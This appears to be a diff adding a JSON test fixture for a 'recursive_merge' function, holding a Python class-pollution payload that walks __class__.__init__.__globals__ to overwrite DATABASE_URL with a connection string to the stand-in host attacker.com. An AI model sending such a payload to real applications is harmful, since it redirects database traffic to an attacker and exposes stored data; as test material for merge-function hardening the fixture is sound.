@@ -1,0 +1,12 @@
+{
+  "merge_fn": "recursive_merge",
+  "payload": {
+    "__class__": {
+      "__init__": {
+        "__globals__": {
+          "DATABASE_URL": "postgresql://evil:evil@attacker.com/db"
+        }
+      }
+    }
+  }
+}
